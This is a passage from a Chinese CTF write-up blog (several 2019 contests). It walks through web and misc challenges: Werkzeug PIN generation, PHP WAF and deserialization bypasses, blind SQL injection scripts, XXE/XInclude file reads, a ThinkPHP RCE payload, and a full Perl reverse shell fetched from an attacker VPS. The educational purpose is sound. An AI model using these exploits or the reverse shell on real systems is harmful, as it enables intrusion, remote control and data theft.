[+]modify here ] h = hashlib.md5() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#39;utf-8&#39;) h.update(bit) h.update(b&#39;cookiesalt&#39;) cookie_name = &#39;__wzd&#39; + h.hexdigest()[:20] num = None if num is None: h.update(b&#39;pinsalt&#39;) num = (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9] rv =None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;) for x in range(0, len(num), group_size)) break else: rv = num print(rv) 爆破出PIN码（因为mathine-id一直在变化，所以爆破出来尽快使用） 先打开debug，点击右边的小console，弹窗中输入PIN码 验证成功后就可以执行Python命令了，拿下 flag simple_xss 点击register注册一个用户，然后登陆 留言功能可以将留言提交给任意用户，测试发现存在XSS，但是有长度限制。利用XSS平台的链接，把留言弹给admin 用拿到的cookie登录，拿下flag hacker_backdoor本题是inctf PHP1.0的变形，加上过滤了eval，assert函数 代码如下 &lt;?php error_reporting(0); if(!isset($_GET[&#39;code&#39;]) || !isset($_GET[&#39;useful&#39;])){ highlight_file(__file__); } $code = $_GET[&#39;code&#39;]; $usrful = $_GET[&#39;useful&#39;]; function waf($a){ $dangerous = get_defined_functions(); array_push($dangerous[&quot;internal&quot;], &#39;eval&#39;, &#39;assert&#39;); foreach ($dangerous[&quot;internal&quot;] as $bad) { if(strpos($a,$bad) !== FALSE){ return False; break; } } return True; } if(file_exists($usrful)){ if(waf($code)){ eval($code); } else{ die(&quot;oh,不能输入这些函数哦 :) &quot;); } } get_defined_functions() 其中 所以黑名单就是所有内置函数，然后再加上eval()、assert()。因为php可以按如下方式拼接成一个字符串，所以也就可以完美绕过 WAF 我们可以通过以下方式来执行命令 disable_functions 如下 pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete 发现proc_open()没有被禁用，可以用过它来命令执行，查看flag。但是并不知道flag的路径，但是发现根目录下有/readflag 跑这个文件应该就可以拿下flag，因为proc_open()没有直接地结果返回，我们可以将其结果输出到一个文件，再去读取这个文件，payload如下 Ps：题目环境不允许重复写文件，过后读也不行，所以打的时候换个文件，马上打马上读 ?useful=/etc/passwd&amp;code=$a=p.r.o.c._.o.p.e.n;$a(&quot;/readflag&gt;/tmp/knlvre&quot;,array(),$z); 拿下flag ?useful=/etc/passwd&amp;code=$a=s.h.o.w._.s.o.u.r.c.e;$a(&quot;/tmp/knlvre&quot;);","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"成都大学第二届玄武杯 Write Up","slug":"成都大学第二届玄武杯 Write Up","date":"2019-11-21T16:00:00.000Z","updated":"2019-11-28T12:05:59.792Z","comments":true,"path":"2019/11/22/成都大学第二届玄武杯 Write Up/","link":"","permalink":"https://knlvre.github.io/2019/11/22/成都大学第二届玄武杯 Write Up/","excerpt":"","text":"成都大学第二届玄武杯比赛面向他们校的新生，所以都是基础题，做了就蛮写一下 GET POST WeekPassword 弱口令爆破 根据题目提示weekpassword，直接top100爆破，拿下 flag serialization-1 反序列化 题目源码 &lt;?php error_reporting(0); class Test { private $a = &#39;nothing&#39;; public function __destruct() { if($this-&gt;a != &#39;nothing&#39;) { highlight_file(&#39;flag.php&#39;); } else { echo &#39;No Flag!&#39;; } } } if(isset($_GET[&#39;data&#39;])) { unserialize($_GET[&#39;data&#39;]); } else { highlight_file(__FILE__); } 只要$a不等于nothing就可以直接拿 flag，POC如下 &lt;?php class Test{ private $a; public function __construct(){ $this-&gt;a = &quot;anything&quot;; } } $b = new Test(); echo urlencode(serialize($b)); ?&gt; 将序列化字符串经过urlencode()是因为private属性会有不可见字符，编码后可用 百度 没有其他发现，还下载图片查看。最后扫目录，发现robots.txt 访问拿到 flag SQL-1 发现password处存在盲注，回显Login Fail!和Login Success! EXP import requests,string all_string = string.printable url = &quot;http://47.93.249.236:10001/index.php&quot; data = { &quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:&quot;&quot; } flag = &quot;&quot; #table:users #column:id,username,password #flag:flag{sql1-wArn1ng} for i in range(1,30): for j in range(32,126): #s = &quot;0&#39; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d #&quot;%(i,j) #s = &quot;0&#39; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),%d,1))=%d #&quot;%(i,j) s = &quot;0&#39; or ascii(substr((select password from users where username=&#39;admin&#39;),%d,1))=%d #&quot;%(i,j) data[&quot;password&quot;] = s response = requests.post(url,data) if(&quot;Login Success!&quot; in response.text): flag = flag + str(chr(j)) print(flag) break Hash 查看源码，有提示hint.php，查看发现如下代码 function ctt($key) { $t=&quot;&quot;; for($i=0;$i&lt;strlen($key);++$i) { $t.=chr(ord($key[$i])^$i); } return $t; } $auth = false; $role1 = &quot;xxxxxxxxx&quot;; $salt = &quot;xxxxxxxxxx&quot;;//闀垮害涓嶈秴杩�15 if (isset($_COOKIE[&quot;role_true&quot;])) { $hsh = $_COOKIE[&quot;hsh&quot;]; if ($_COOKIE[&quot;role_true&quot;] === $role1 &amp;&amp; $hsh === md5($salt.urldecode($_COOKIE[&quot;role&quot;]))) { $auth = true; } else { $auth = false; } } else { $s =$role1; setcookie(&#39;role&#39;,ctt(base64_encode($s))); $hsh = md5($salt.ctt(base64_encode($s))); setcookie(&#39;hsh&#39;,$hsh); } if ($auth) { echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;; } else { echo &quot;&lt;h3&gt;Only True Admin can see the flag!!&lt;/h3&gt;&quot;; } 看一下cookie 因为cookie会自动url编码，所以需要先解码一下。先运行脚本得到role1的值为adminadmin。然后仔细观察，发现只要urldecode($_COOKIE[“role”])等于ctt(base64_encode($s))就能通过第二个条件，完整 EXP 如下 &lt;?php function ctt($key) { $t=&quot;&quot;; for($i=0;$i&lt;strlen($key);++$i) { $t.=chr(ord($key[$i])^$i); } return $t; } echo base64_decode(ctt(urldecode(&quot;YVPweR3oRN%3B%7Bnj32&quot;))).&quot;\\n&quot;; $s = &quot;adminadmin&quot;; echo urlencode(ctt(base64_encode($s))); ?&gt; 然后把得到的值拿去提交就行了 矛盾题目源码 no &lt;?php include(&#39;flag.php&#39;); $f1 = @$_GET[&#39;f1&#39;]; $f2 = @$_POST[&#39;f2&#39;]; $f3 = @$_COOKIE[&#39;f3&#39;]; if($f2 !== &#39;0&#39;) { echo &#39;no&#39;; } else { if($f1 == 0 and $f1 !== 0) { $f2 == $f3; if(md5($f2) == 0 and $f2 == 0) { echo $flag; } } } highlight_file(__FILE__); $f2和$f3全部传入字符串的0就可以了","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"百越杯初赛 Write Up","slug":"百越杯初赛 Write Up","date":"2019-11-19T16:00:00.000Z","updated":"2019-11-28T12:10:41.710Z","comments":true,"path":"2019/11/20/百越杯初赛 Write Up/","link":"","permalink":"https://knlvre.github.io/2019/11/20/百越杯初赛 Write Up/","excerpt":"","text":"百越杯初赛记录 2 道 web 题，2 道 Misc 题 babyphp题目源码 &lt;?php error_reporting(1); class Read { private $var; public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } public function __invoke() { $content = $this-&gt;file_get($this-&gt;var); echo $content; } } class Show { public $source; public $str; public function __construct($file = &#39;index.php&#39;) { $this-&gt;source = $file; echo $this-&gt;source . &#39;瑙ｆ瀽寮€濮�&#39; . &quot;&lt;br&gt;&quot;; } public function __toString() { $this-&gt;str[&#39;str&#39;]-&gt;source; } public function _show() { if (preg_match(&#39;/http|https|file:|gopher|dict|\\.\\.|fllllllaaaaaag/i&#39;, $this-&gt;source)) { die(&#39;hacker!&#39;); } else { highlight_file($this-&gt;source); } } public function __wakeup() { if (preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; } } } class Test { public $params; public function __construct() { $this-&gt;params = array(); } public function __get($key) { $func = $this-&gt;params; return $func(); } } if (isset($_GET[&#39;chal&#39;])) { $chal = unserialize($_GET[&#39;chal&#39;]); } else { $show = new Show(&#39;index.php&#39;); $show-&gt;_show(); } ?&gt; 从几个类的魔术方法来构造POP链： ① 很明显这道题目能够读取文件的函数是Read::file_get()方法中的file_get_contents()函数，而其又由Read::__invoke()魔术方法触发 ② __invoke魔术方法触发的条件是：当尝试以调用方法的方式调用一个对象时。而我们发现本题中只有Test::__get()魔术方法的return $func()可以触发，只要$func = new Read()就可以，因为会等于return Read()，此时Read不只是类名，因为后面被加上括号，所以被当成了方法。 此时需要触发Test::__get()魔术方法 ③ __get()魔术方法触发的条件是：当访问类中的一个不存在属性时。我们发现Show::__toString()魔术方法中的语句：$this-&gt;str[‘str’]-&gt;source，可以令str[‘str’] = new Test()，而source是Test类中没有的属性。此时就需要触发Show::_toString()魔术方法，发现Show::__wakeup()魔术方法中的preg_match()函数有$this-&gt;source并且会将其当做字符串来匹配，所以此时只要$this-&gt;source = new Show()。 ④ 而出发Show::__wakeup()魔术方法就是unserialize()函数 以此写 POC 生成反序列化字符串 Ps：① 这里的$a-&gt;source = new Show();不能写在Show::_construct()魔术方法中，不然会一直循环；② payload 需要urlencode的原因是Read类的private $var序列化后会有不可见字符，url 编码之后不容易出错 &lt;?php class Read{ private $var; public function __construct(){ $this-&gt;var = &quot;/var/www/html/fllllllaaaaaag.php&quot;; } } class Show{ public $source; public $str; public function __construct(){ $this-&gt;str = array(&quot;str&quot;=&gt;new Test()); } } class Test{ public $params; public function __construct(){ $this-&gt;params = new Read(); } } $a = new Show(); $a-&gt;source = new Show(); echo urlencode(serialize($a)).&quot;\\n&quot;; ?&gt; 序列化字符串 O:4:&quot;Show&quot;:2:{ s:6:&quot;source&quot;;O:4:&quot;Show&quot;:2:{ s:6:&quot;source&quot;;N; s:3:&quot;str&quot;;a:1:{ s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{ s:6:&quot;params&quot;;O:4:&quot;Read&quot;:1:{ s:9:&quot;Readvar&quot;;s:32:&quot;/var/www/html/fllllllaaaaaag.php&quot;; } } } } s:3:&quot;str&quot;;a:1:{ s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:{ s:6:&quot;params&quot;;O:4:&quot;Read&quot;:1:{ s:9:&quot;Readvar&quot;;s:32:&quot;/var/www/html/fllllllaaaaaag.php&quot;; } } } } 拿下 flag babygame打开靶机，有一个登录和注册功能，源代码中有提示： \\&lt;!– if you need hash tools, location: tools.php –> 访问tools.php，页面要求提交一个md5值： 但是提交一个1的md5值，返回无结果 暂时不知道怎么利用，只能去看看登录注册功能 注册发现admin用户存在，注册其他用户登录 发现跳转到了manage.php，action参数测试发现无文件包含点，点进去here is your flag 给了一个假flag，又看起来像是md5值，拿进去tools.php里面查询也没有返回结果 然后就是msgid疑似注入点，但是除了1以外其他都没有返回结果 目光回到注册登录功能上，先尝试了一下约束攻击，发现注册 admin 1 ，在登陆以后，成功登录admin 但是，点进here is your flag里面还是没有flflag 这里有两个here is your flag，估计是因为除了我们注册的admin(空格)外，另外还有一个原本admin的 并且发现，当注册一个带有单引号的 admin’ ，会被转义，并且没有显示出here is your flag的链接 所以，猜测这里存在二次注入点，但是一直没试成功，直到放出了提示：二次注入测试引号逃逸 看到了引号逃逸，就直接想到了之前约束攻击，其实不是约束攻击，而是后台用了字符串截取，测试发现，最大长 度为：30 逃逸过程如下： 重点是让传入的 username 有反斜杠，但没有单引号，下面会说原因 注册：admin &#39; =&gt; 长度30 经过转义处理：admin \\&#39; =&gt; 长度31 经过substr截取前30个字符：admin \\ =&gt;长度30 =&gt;单引号逃逸 结合之前的here is your flag链接中的参数msgid，就猜测，注册后执行的查询语句： select * from users where username=&#39;&#39; and msgid=&#39;1&#39;; 那么既然逃逸了username后面的单引号，就只能在msgid中执行注入，payload： ?msgid= or 1# ?msgid = or 0# 拼接后为 select * from users where username=&#39;admin...\\&#39; and msgid=&#39; or 0 #&#39;; 因为前面传递了反斜杠，将原本的单引号注释掉，与后面的 msgid 的单引号闭合，才能用 or 进行盲注。这里如果多传入一个单引号也不行，因为会造成闭合，并且无法注释掉原本语句内的单引号 条件为真时有返回结果，为假时无返回 根据这个逻辑进行盲注，exp如下： import requests s = requests.Session() url1 = &quot;http://77cc22401a0b4c509844fd0277781be185c94a4e768f402f.changame.ichunqiu.com/manage.php? action=register&quot; url2 = &quot;http://77cc22401a0b4c509844fd0277781be185c94a4e768f402f.changame.ichunqiu.com/manage.php?msgid=&quot; data = { &quot;username&quot;: &quot;admin &#39;&quot;, &quot;password&quot;: &quot;123&quot; } r1 = s.post(url1, data = data) database = &quot;&quot;#web3 web3 table_name = &quot;flags,users&quot; column_name = &quot;id,username,password&quot; admin_password = &quot;&quot; print r1.text for i in range(1, 50): for j in range(44, 128): #payload = &quot;%20or%20ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20 where%20table_name=0x7573657273),&quot; + str(i) + &quot;,1))=&quot; + str(j) + &quot;%23&quot; payload = &quot;%20or%20ascii(substr((select%20group_concat(password)%20from%20users%20where%20username=0x61646 d696e),&quot; + str(i) + &quot;,1))=&quot; + str(j) + &quot;%23&quot; r2 = s.get(url2 + payload) if &quot;may be you need to be admin!&quot; in r2.text: database = database + chr(j) print database 注出admin的密码：251471f34244cb6cd61f6b64c63f7b1a 是md5，直接解密不了，这时候就想到了之前的tools.php，查询得到明文：ChunQiuGame 登录admin后，跳转到 manage.php?action=admin ，提示我们POST content 参数进行xxe 尝试直接引入外部实体读取文件： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;abc&gt;&amp;test;&lt;/abc&gt; 但是没有返回结果，从相应来看，也没有过滤掉什么关键字 尝试无回显xxe，都失败了 赛后得到的提示是：xinclude 参考：https://www.anquanke.com/post/id/156227#h3-5 里面提到： 发现我们可控xml文本内容，但是引入外部实体无效或是存在过滤，尝试编码绕过也不行的时候，那么可以尝试使用 xinclude 猜测后台的源码应该是这样的： &lt;?php $dom = new DOMDocument; $dom-&gt;preserveWhiteSpace = false; $dom-&gt;formatOutput = true; $dom-&gt;loadXML($xml); echo $dom-&gt;saveXML(); ?&gt; 直接用传统引入外部实体的方法读取文件，是因为php的xml库的底层库是libxml2，而在2.6版本之后，改库已默 认禁用外部实体引用的解析 我们只有加入LIBXML_NOENT 选项，才能解析外部实体： $dom-&gt;loadXML($xml,LIBXML_NOENT); 而xinclude无需使用 LIBXML_NOENT 选项去开启默认关闭的外部实体引用 最后传入payload： &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt; &lt;xi:include href=&quot;file:///flag&quot; parse=&quot;text&quot;/&gt; &lt;/root&gt; 哈尔的移动城堡首先题目解压出来 2 个文件 Winhex打开这个102%发现文件头很熟悉 89 47 4E 50 就是png图片文件头的变形，将其修改回来。并且添加后缀就可以看到图片 89 50 4E 47 将ori.jpg做成灰度图（可以用在线网站： http://grayscale.imageonline.co/cn/ ） 下载其png格式，这里命名为ori_grey.png 然后用PS打开102%.png和ori_gray.png，然后复制 ori_gray.png 的图层到 102%.png 上 然后来到 102%.png ，选择模式为减去 然后选择色阶，调到最左边，就可以看见二维码了 扫描二维码，得到一串字符串：1tsEz_b14ndVV4t3rM4k 然后binwalk那张 102%.png 图片，发现有压缩包，但是没那么简单，因为这个图片文件里一共有2个zip文件头（50 4B 03 04），但是前面的 zip 文件头被改成了4B 50 03 04，所以foremost只识别到后面那个，提取出来的不完整。正确做法是搜索 png 图片结尾（49 45 4E 44 AE 42 60 82），然后就会发现被修改的 zip 文件头，修改它并从那里提取出来，才能完整 解压需要密码，就用刚才二维码扫出来的字符串解密，得到2张图片 然后用Stegsolve先打开其中一张图片，点击Analyse -&gt; Image Combiner选择第二张图片，就能看到 flag 的字样 可以将模式调整为SUB，这样看的比较清晰一些（或者先保存下载，然后再次打开调整） 打出来就是flag{3399dcb7-9e15-422f-9bf9-9db30dab70ae} 签到题目：cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9 exp import base64 s = &quot;cGxlYXNlIHN1Ym1pdDogZmxhZ3toZWxsb19ieWJ9&quot; print(base64.b64decode(s)) 拿到 flag ：please submit: flag{hello_byb} key找到原题： https://blog.csdn.net/afu42832/article/details/101767856 exp rgb=[&quot;2f&quot;,&quot;3f&quot;,&quot;24&quot;, &quot;22&quot;,&quot;2e&quot;,&quot;13&quot;, &quot;7f&quot;,&quot;66&quot;,&quot;24&quot;, &quot;71&quot;,&quot;36&quot;,&quot;45&quot;, &quot;7b&quot;,&quot;7e&quot;,&quot;27&quot;, &quot;72&quot;,&quot;33&quot;,&quot;10&quot;, &quot;64&quot;,&quot;67&quot;,&quot;21&quot;, &quot;76&quot;,&quot;67&quot;,&quot;0c&quot;, &quot;70&quot;,&quot;37&quot;,&quot;23&quot;, &quot;72&quot;,&quot;78&quot;,&quot;16&quot;, &quot;7a&quot;,&quot;60&quot;,&quot;20&quot;, &quot;21&quot;,&quot;33&quot;,&quot;45&quot;, &quot;7b&quot;,&quot;32&quot;,&quot;77&quot;, &quot;74&quot;,&quot;37&quot;,&quot;5c&quot;] key=&quot;ISEEU!&quot; j=0 for i in rgb: print(chr(int(i,16)^ord(key[j])),end=&#39;&#39;) j+=1 j%=6 拿到 flag ：flag{265a4cd2-b7f1-4d32-9df7-733edfd2a21b} WireLesswifi密码破解 crunch 8 8 -t 6666%%%% &gt;&gt; pass.txt aircrack-ng -w pass.txt WiFi.pcap 参考:https://jwt1399.top/2019/07/29/ctf-liu-liang-fen-xi-zong-jie/","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"湖湘杯复赛 Write Up","slug":"湖湘杯复赛 Write Up","date":"2019-11-08T16:00:00.000Z","updated":"2019-11-27T12:40:58.123Z","comments":true,"path":"2019/11/09/湖湘杯复赛 Write Up/","link":"","permalink":"https://knlvre.github.io/2019/11/09/湖湘杯复赛 Write Up/","excerpt":"","text":"湖湘杯复赛时间：2019年11月9号 记录 2 道 Web 题目，2 道 Misc 题目 untar参考文章：记一次对ssrf的理解 源码如下 &lt;?php $sandbox = &quot;sandbox/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); echo $sandbox.&quot;&lt;/br&gt;&quot;; @mkdir($sandbox); @chdir($sandbox); if (isset($_GET[&quot;url&quot;]) &amp;&amp; !preg_match(&#39;/^(http|https):\\/\\/.*/&#39;, $_GET[&quot;url&quot;])) die(); $url = str_replace(&quot;|&quot;, &quot;&quot;, $_GET[&quot;url&quot;]); $data = shell_exec(&quot;GET &quot; . escapeshellarg($url)); $info = pathinfo($_GET[&quot;filename&quot;]); $dir = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[&quot;basename&quot;]), $data); shell_exec(&quot;UNTAR &quot;.escapeshellarg(basename($info[&quot;basename&quot;]))); highlight_file(__FILE__); ?&gt; 这是一道SSRF题目 传入的参数一共只有 2 个：url和filename：① 参数 url 只能使用http://或者https://协议；② 参数 filename 经过pathinfo()函数处理；二者都用escapeshellarg()函数处理 escapeshellarg() 作用：给参数加上单引号 php &gt; var_dump(escapeshellarg(&quot;file&quot;)); string(6) &quot;&#39;file&#39;&quot; pathinfo() 作用：以数组的形式返回文件路径的信息 php &gt; var_dump(pathinfo(&quot;file&quot;)); array(3) { [&quot;dirname&quot;]=&gt; string(1) &quot;.&quot; [&quot;basename&quot;]=&gt; string(4) &quot;file&quot; [&quot;filename&quot;]=&gt; string(4) &quot;file&quot; } php &gt; var_dump(pathinfo(&quot;path/file.php&quot;)); array(4) { [&quot;dirname&quot;]=&gt; string(4) &quot;path&quot; [&quot;basename&quot;]=&gt; string(8) &quot;file.php&quot; [&quot;extension&quot;]=&gt; string(3) &quot;php&quot; [&quot;filename&quot;]=&gt; string(4) &quot;file&quot; } 解题思路 弄清楚之后，我们直接看着 payload 梳理解题思路，payload 如下 第一次执行： ?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt 第二次执行： ?filename=xxx&amp;url=http://Your_VPS_IP Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口 ① 首先分析第一个 payload ?filename=URI/listen.pm&amp;url=http://Your_VPS_IP/backdoor.txt 看一下 pathinfo() 对我们第一个 payload 中 filename 参数的解析 php &gt; var_dump(pathinfo(&quot;URI/listen.pm&quot;)); array(4) { [&quot;dirname&quot;]=&gt; string(3) &quot;URI&quot; [&quot;basename&quot;]=&gt; string(9) &quot;listen.pm&quot; [&quot;extension&quot;]=&gt; string(2) &quot;pm&quot; [&quot;filename&quot;]=&gt; string(6) &quot;listen&quot; } backdoor.txt 像参考文章说的一样，是一个perl后门，内容如下： :alarm_clock:后门内的 ip 要记得改成你的 VPS 的 ip #!/usr/bin/perl -w # perl-reverse-shell - A Reverse Shell implementation in PERL use strict; use Socket; use FileHandle; use POSIX; my $VERSION = &quot;1.0&quot;; # Where to send the reverse shell. Change these. my $ip = &#39;127.0.0.1&#39;; my $port = 1234; # Options my $daemon = 1; my $auth = 0; # 0 means authentication is disabled and any # source IP can access the reverse shell my $authorised_client_pattern = qr(^127\\.0\\.0\\.1$); # Declarations my $global_page = &quot;&quot;; my $fake_process_name = &quot;/usr/sbin/apache&quot;; # Change the process name to be less conspicious $0 = &quot;[httpd]&quot;; # Authenticate based on source IP address if required if (defined($ENV{&#39;REMOTE_ADDR&#39;})) { cgiprint(&quot;Browser IP address appears to be: $ENV{&#39;REMOTE_ADDR&#39;}&quot;); if ($auth) { unless ($ENV{&#39;REMOTE_ADDR&#39;} =~ $authorised_client_pattern) { cgiprint(&quot;ERROR: Your client isn&#39;t authorised to view this page&quot;); cgiexit(); } } } elsif ($auth) { cgiprint(&quot;ERROR: Authentication is enabled, but I couldn&#39;t determine your IP address. Denying access&quot;); cgiexit(0); } # Background and dissociate from parent process if required if ($daemon) { my $pid = fork(); if ($pid) { cgiexit(0); # parent exits } setsid(); chdir(&#39;/&#39;); umask(0); } # Make TCP connection for reverse shell socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname(&#39;tcp&#39;)); if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) { cgiprint(&quot;Sent reverse shell to $ip:$port&quot;); cgiprintpage(); } else { cgiprint(&quot;Couldn&#39;t open reverse shell to $ip:$port: $!&quot;); cgiexit(); } # Redirect STDIN, STDOUT and STDERR to the TCP connection open(STDIN, &quot;&gt;&amp;SOCK&quot;); open(STDOUT,&quot;&gt;&amp;SOCK&quot;); open(STDERR,&quot;&gt;&amp;SOCK&quot;); $ENV{&#39;HISTFILE&#39;} = &#39;/dev/null&#39;; system(&quot;w;uname -a;id;pwd&quot;); exec({&quot;/bin/sh&quot;} ($fake_process_name, &quot;-i&quot;)); # Wrapper around print sub cgiprint { my $line = shift; $line .= &quot;&lt;p&gt;\\n&quot;; $global_page .= $line; } # Wrapper around exit sub cgiexit { cgiprintpage(); exit 0; # 0 to ensure we don&#39;t give a 500 response. } # Form HTTP response using all the messages gathered by cgiprint so far sub cgiprintpage { print &quot;Content-Length: &quot; . length($global_page) . &quot;\\r Connection: close\\r Content-Type: text\\/html\\r\\n\\r\\n&quot; . $global_page; } 所以当我们执行第一个 payload 后，会在当前目录下再创建一个URI目录，并且进入这个目录，再创建 listen.pm ，内容为我们的 perl后门（backdoor.txt） ② 接下来分析第二个 payload ?filename=xxx&amp;url=http://Your_VPS_IP Ps:执行前需要在 vps 上写个重定向到 listen://listen.xyz，并且监听端口 由于做了重定向，所以当访问我们的 VPS 时，就等同于访问listen://listen.xyz，但是 listen 是未定义的模块，所以会自动搜索并加载URI/listen.pm（pm 是 perl 脚本的后缀），也就是我们刚在上传的后门（这里因为源码中对参数 url 做了过滤，只允许 http:// 和 https:// 协议，所以不能像参考文章那样直接在 url 参数中写 listen:// ，需要做个重定向来解决） 重定向做完 + 端口监听 + 执行 payload 之后，就会收到 shell 然后执行根目录下的readflag就能拿到 flag thinkphp?按照题目的提示，应该是thinkphp的洞。进来后要登录，先注册一个普通用户登录 然后用这个普通用户登陆进去 打算直接用一下之前刚碰到的thinkphp 5.0.23的RCE，看一下漏洞是否存在，结果直接看到版本号 http://183.129.189.62:19403/?s=captcha 参考文章：记一次有趣的tp5代码执行 试一下scandir()和var_dump()，扫描当前目录，直接出结果 URL：http://183.129.189.62:19403/index.php?s=captcha POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=. 然后在根目录下找到flag字样 URL：http://183.129.189.62:19403/index.php?s=captcha POST：_method=__construct&amp;method=get&amp;filter[]=scandir&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../ 直接读取内容，拿下 flag URL：http://183.129.189.62:19403/index.php?s=captcha POST：_method=__construct&amp;method=get&amp;filter[]=readfile&amp;filter[]=var_dump&amp;server[]=1&amp;get[]=../../../flag something in image解压下来一个名为badimages的文件，直接拿到 fl strings badimages | grep -i flag EzMemory文件有点大，但是跟上一题一样，还是直接拿下 flag strings mem.raw | grep -i flag{ #","categories":[],"tags":[{"name":"CTF比赛","slug":"CTF比赛","permalink":"https://knlvre.github.io/tags/CTF比赛/"}],"author":"Knlvre"},{"title":"第五届上海市大学生网络安全大赛 Write Up","slug":"第五届上海市大学生网络安全大赛 Write Up","date":"2019-11-01T16:00:00.000Z","updated":"2019-11-27T12:34:37.902Z","comments":true,"path":"2019/11/02/第五届上海市大学生网络安全大赛 Write Up/","link":"","permalink":"https://knlvre.github.io/2019/11/02/第五届上海市大学生网络安全大赛 Write Up/","excerpt":"","text":"第五届上海市大学生网络安全大赛时间：2019年11月2号 记录 4 道 Web 题目（其中一道为 Bytectf boring_code） Bytectf boring_code因为 decade 这道题涉及到 boring_code 的知识点，所以决定在本文章中复现一下这道题目 题目源码 &lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&#39;/data:\\/\\//i&#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&#39;url&#39;])){ $url = $_POST[&#39;url&#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&#39;/baidu\\.com$/&#39;, $r[&#39;host&#39;])) { $code = file_get_contents($url); if (&#39;;&#39; === preg_replace(&#39;/[a-z]+\\((?R)?\\)/&#39;, NULL, $code)) { if (preg_match(&#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#39;, $code)) { echo &#39;bye~&#39;; } else { eval($code); } } } else { echo &quot;error: host not allowed&quot;; } } else { echo &quot;error: invalid url&quot;; } }else{ highlight_file(__FILE__); } ?&gt; Bypass 第一层 第一层关键过滤代码如下 &lt;?php filter_var($url, FILTER_VALIDATE_URL) preg_match(&#39;/data:\\/\\//i&#39;, $url) parse_url($url) preg_match(&#39;/baidu\\.com$/&#39;, $r[&#39;host&#39;]) ?&gt; 绕过filter_var()和preg_match()函数的文章看这篇： https://www.jianshu.com/p/80ce73919edb filter_var() parse_url 本题正确方法如下： ① 氪金，购买一个含有 baidu.com 的域名 ② 使用 ftp 协议： ftp://ip:port,baidu.com:80/filename.txt ③ 使用一个百度的任意跳转的漏洞，具体可以参考 ：https://www.4xseo.com/marketing/1280/#title-0 ④ compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time( chdir(next(scandir(pos(localeconv())))))))))))); $code的值通过file_get_content()函数获取，而它正是eval()的参数，所以我们才要想尽办法绕过第一层把这个 $code 送进去 eval() 函数内。上面提到的4种方法中，氪金当然是最简单直接地，但是如果不氪金，选择第4种方法 compress.zlib://data:@baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); 首先需要注意的是，这里用的是data:@，而不是data://，但是两者却有一样的效果，也就是等同。所以这样可以绕过对data://的正则匹配 然后看一下filter_var()、parse_url()、file_get_content()对它的处理 filter_var() 为什么这里还要用compress.zlib://呢，因为filter_var()不同意data:@（虽然它等同于data://）。但是加上 compress.zlib:// 就同意了，也算是一种绕过 php &gt; var_dump(filter_var(&quot;data:@baidu.com/baidu.com?,echo(readfile(end (scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;, FILTER_VALIDATE_URL)); bool(false) php &gt; var_dump(filter_var(&quot;data://baidu.com/baidu.com?,echo(readfile(end (scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));&quot;, FILTER_VALIDATE_URL)); string(125) &quot;data://baidu.com/baidu.com?,echo(readfile(end(scandir(chr(pos(localtime (time(chdir(next(scandir(pos(localeconv()))))))))))));&quot; php &gt; 